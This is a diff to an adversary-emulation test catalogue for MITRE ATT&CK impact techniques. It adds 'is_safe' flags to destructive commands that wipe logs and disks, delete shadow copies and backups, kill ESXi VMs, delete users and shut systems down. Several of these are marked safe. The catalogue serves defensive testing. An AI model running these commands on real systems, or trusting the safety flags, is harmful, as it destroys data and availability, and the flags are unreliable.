@@ -18,29 +18,34 @@
         if (-not (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt")) { New-Item "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt" -Force }
         & "PathToAtomicsFolder\..\ExternalPayloads\Sdelete\sdelete.exe" -accepteula "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt"
       timeout: 120
+      is_safe: true
     - name: FreeBSD/macOS/Linux - Overwrite file with DD
       type: sh
       platform: linux
       command: dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes
       timeout: 60
+      is_safe: true
     - name: FreeBSD/macOS/Linux - Overwrite file with DD
       type: sh
       platform: macos
       command: dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes
       timeout: 60
+      is_safe: true
     - name: Overwrite deleted data on C drive
       type: cmd
       platform: windows
       command: 'cipher.exe /w:C:'
       timeout: 120
+      is_safe: true
     - name: ESXi - Delete VM Snapshots
       type: cmd
       platform: windows
       command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1485
-  is_safe: false
+  is_safe: true
 - id: T1486
   name: Data Encrypted for Impact
   description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key ...
@@ -56,6 +61,7 @@
       command: echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd
       cleanup: rm /tmp/passwd.gpg
       timeout: 60
+      is_safe: true
     - name: Encrypt files using 7z (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -64,6 +70,7 @@
         $which_7z e /tmp/passwd.zip
         rm /tmp/passwd.zip
       timeout: 60
+      is_safe: true
     - name: Encrypt files using ccrypt (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -73,6 +80,7 @@
         $which_ccencrypt -T -K passwd /tmp/passwd
       cleanup: rm /tmp/passwd.cpt
       timeout: 60
+      is_safe: true
     - name: Encrypt files using openssl (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -85,6 +93,7 @@
         $which_openssl rsautl -decrypt -inkey /tmp/key.pem -in /tmp/passwd.zip
         rm /tmp/passwd.zip
       timeout: 60
+      is_safe: true
     - name: PureLocker Ransom Note
       type: cmd
       platform: windows
@@ -92,18 +101,21 @@
       cleanup: del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Encrypt files using 7z utility - macOS
       type: sh
       platform: macos
       command: 7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt
       cleanup: rm ARTArchive.7z
       timeout: 60
+      is_safe: true
     - name: Encrypt files using openssl utility - macOS
       type: sh
       platform: macos
       command: openssl enc -pbkdf2 -in ~/test.txt -out ARTFile
       cleanup: rm ARTFile
       timeout: 60
+      is_safe: true
     - name: Data Encrypted with GPG4Win
       type: powershell
       platform: windows
@@ -114,12 +126,14 @@
         Remove-Item -Path "$env:temp\test.txt" -Force -ErrorAction SilentlyContinue
         Remove-Item -Path "$env:temp\test.txt.gpg" -Force -ErrorAction SilentlyContinue
       timeout: 120
+      is_safe: true
     - name: Data Encrypt Using DiskCryptor
       type: cmd
       platform: windows
       command: '""%PROGRAMFILES%\dcrypt"\dcrypt.exe"'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Akira Ransomware drop Files with .akira Extension and Ransomnote
       type: powershell
       platform: windows
@@ -148,9 +162,10 @@
       cleanup: "del $env:Userprofile\\Desktop\\akira_readme.txt \ndel c:\\test.*.akira"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1486
-  is_safe: false
+  is_safe: true
 - id: T1489
   name: Service Stop
   description: "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will m..."
@@ -167,6 +182,7 @@
       cleanup: sc.exe start spooler >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Stop service using net.exe
       type: cmd
       platform: windows
@@ -174,11 +190,13 @@
       cleanup: net.exe start spooler >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Stop service by killing process
       type: cmd
       platform: windows
       command: taskkill.exe /f /im spoolsv.exe
       timeout: 120
+      is_safe: true
     - name: Linux - Stop service using systemctl
       type: sh
       platform: linux
@@ -186,6 +204,7 @@
       cleanup: sudo systemctl start cron 2> /dev/null
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Linux - Stop service by killing process using killall
       type: sh
       platform: linux
@@ -193,6 +212,7 @@
       cleanup: sudo systemctl start cron 2> /dev/null
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Linux - Stop service by killing process using kill
       type: sh
       platform: linux
@@ -200,6 +220,7 @@
       cleanup: sudo systemctl start cron 2> /dev/null
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Linux - Stop service by killing process using pkill
       type: sh
       platform: linux
@@ -207,15 +228,17 @@
       cleanup: sudo systemctl start cron 2> /dev/null
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Abuse of linux magic system request key for Send a SIGTERM to all processes
       type: bash
       platform: linux
       command: echo "e" > /proc/sysrq-trigger
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1489
-  is_safe: false
+  is_safe: true
 - id: T1490
   name: Inhibit System Recovery
   description: |-
@@ -234,18 +257,21 @@
       command: vssadmin.exe delete shadows /all /quiet
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Delete Volume Shadow Copies via WMI
       type: cmd
       platform: windows
       command: wmic.exe shadowcopy delete
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - wbadmin Delete Windows Backup Catalog
       type: cmd
       platform: windows
       command: wbadmin delete catalog -quiet
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Disable Windows Recovery Console Repair
       type: cmd
       platform: windows
@@ -257,24 +283,28 @@
         bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
       type: powershell
       platform: windows
       command: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Delete Backup Files
       type: cmd
       platform: windows
       command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - wbadmin Delete systemstatebackup
       type: cmd
       platform: windows
       command: wbadmin delete systemstatebackup -keepVersions:0
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - Disable the SR scheduled task
       type: cmd
       platform: windows
@@ -282,6 +312,7 @@
       cleanup: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Disable System Restore Through Registry
       type: cmd
       platform: windows
@@ -297,12 +328,14 @@
         reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows - vssadmin Resize Shadowstorage Volume
       type: powershell
       platform: windows
       command: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modify VSS Service Permissions
       type: cmd
       platform: windows
@@ -310,6 +343,7 @@
       cleanup: sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Disable Time Machine
       type: sh
       platform: macos
@@ -317,12 +351,14 @@
       cleanup: sudo tmutil enable
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Windows - Delete Volume Shadow Copies via Diskshadow
       type: powershell
       platform: windows
       command: '"delete shadows all" | diskshadow.exe'
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1490
   is_safe: false
@@ -341,6 +377,7 @@
       command: "$url = \"https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png\"\n$imgLocation = \"$env:TEMP\\T1491.001-newWallpaper.png\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}"
       cleanup: "$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\nif (Test-Path -Path $env:TEMP\\T1491.001-OrginalWallpaperLocation -PathType Leaf) {\n     $orgImg = Get-Content -Path \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\"\n     add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\T1491.001-newWallpaper.png\" -ErrorAction Ignore"
       timeout: 120
+      is_safe: true
     - name: Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message
       type: powershell
       platform: windows
@@ -356,11 +393,13 @@
         Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: ESXi - Change Welcome Message on Direct Console User Interface (DCUI)
       type: cmd
       platform: windows
       command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"
       timeout: 120
+      is_safe: true
     - name: Windows - Display a simulated ransom note via Notepad (non-destructive)
       type: powershell
       platform: windows
@@ -410,9 +449,10 @@
           Write-Warning "Cleanup failed with error: $_"
         }
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1491/001
-  is_safe: false
+  is_safe: true
 - id: T1496
   name: Resource Hijacking
   description: "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nResource hijacking may take a number of different forms. For example, adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n* Abuse cloud-based messaging services to send large quantities of spam messages\n\nIn some cases, adversaries may le..."
@@ -427,11 +467,13 @@
       platform: linux
       command: yes > /dev/null
       timeout: 60
+      is_safe: true
     - name: FreeBSD/macOS/Linux - Simulate CPU Load with Yes
       type: sh
       platform: macos
       command: yes > /dev/null
       timeout: 60
+      is_safe: true
     - name: Windows - Simulate CPU Load with PowerShell
       type: powershell
       platform: windows
@@ -440,9 +482,10 @@
         1..4 | ForEach-Object { Start-Job { param($t) while((Get-Date) -lt $t) { $i=0; while($i -lt 200000){$i++} } } -ArgumentList $end }
         Get-Job | Wait-Job | Remove-Job
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1496
-  is_safe: false
+  is_safe: true
 - id: T1529
   name: System Shutdown/Reboot
   description: 'Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may...'
@@ -458,114 +501,133 @@
       command: shutdown /s /t 1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Restart System - Windows
       type: cmd
       platform: windows
       command: shutdown /r /t 1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Restart System via `shutdown` - FreeBSD/macOS/Linux
       type: sh
       platform: linux
       command: shutdown -r now
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Restart System via `shutdown` - FreeBSD/macOS/Linux
       type: sh
       platform: macos
       command: shutdown -r now
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Shutdown System via `shutdown` - FreeBSD/macOS/Linux
       type: sh
       platform: linux
       command: shutdown -h now
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Shutdown System via `shutdown` - FreeBSD/macOS/Linux
       type: sh
       platform: macos
       command: shutdown -h now
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Restart System via `reboot` - FreeBSD/macOS/Linux
       type: sh
       platform: linux
       command: reboot
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Restart System via `reboot` - FreeBSD/macOS/Linux
       type: sh
       platform: macos
       command: reboot
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Shutdown System via `halt` - FreeBSD/Linux
       type: sh
       platform: linux
       command: halt -p
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Reboot System via `halt` - FreeBSD
       type: sh
       platform: linux
       command: halt -r
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Reboot System via `halt` - Linux
       type: bash
       platform: linux
       command: halt --reboot
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Shutdown System via `poweroff` - FreeBSD/Linux
       type: sh
       platform: linux
       command: poweroff
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Reboot System via `poweroff` - FreeBSD
       type: sh
       platform: linux
       command: poweroff -r 3
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Reboot System via `poweroff` - Linux
       type: bash
       platform: linux
       command: poweroff --reboot
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Logoff System - Windows
       type: cmd
       platform: windows
       command: shutdown /l
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: ESXi - Terminates VMs using pkill
       type: cmd
       platform: windows
       command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_pkill.txt"
       timeout: 120
+      is_safe: true
     - name: ESXi - Avoslocker enumerates VMs and forcefully kills VMs
       type: cmd
       platform: windows
       command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_avoslocker_kill_vm.txt"
       timeout: 120
+      is_safe: true
     - name: ESXi - vim-cmd Used to Power Off VMs
       type: cmd
       platform: windows
       command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"
       timeout: 120
+      is_safe: true
     - name: Abuse of Linux Magic System Request Key for Reboot
       type: bash
       platform: linux
       command: echo "b" > /proc/sysrq-trigger
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1529
-  is_safe: false
+  is_safe: true
 - id: T1531
   name: Account Access Removal
   description: 'Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials, revoked permissions for SaaS platforms such as Sharepoint) to remove access to accounts.(Citation: Obsidian Security SaaS Ransomware June 2023) Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious chan...'
@@ -584,6 +646,7 @@
       cleanup: net.exe user AtomicAdministrator /delete >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Delete User - Windows
       type: cmd
       platform: windows
@@ -592,6 +655,7 @@
         net.exe user AtomicUser /delete
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Remove Account From Domain Admin Group
       type: powershell
       platform: windows
@@ -604,18 +668,21 @@
             write-host "Error - Make sure remove_user is in the domain admins group" -foregroundcolor Red
         }
       timeout: 120
+      is_safe: true
     - name: Change User Password via passwd
       type: sh
       platform: macos
       command: 'passwd ARTUser #enter admin password > enter new password > confirm new password'
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Change User Password via passwd
       type: sh
       platform: linux
       command: 'passwd ARTUser #enter admin password > enter new password > confirm new password'
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Delete User via dscl utility
       type: sh
       platform: macos
@@ -628,6 +695,7 @@
         dscl . -passwd /Users/ARTUser ARTPassword #enter password for new user
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Delete User via sysadminctl utility
       type: sh
       platform: macos
@@ -635,6 +703,7 @@
       cleanup: sysadminctl -addUser ARTUserAccount -fullName "ARTUser" -password ARTPassword
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1531
-  is_safe: false
+  is_safe: true
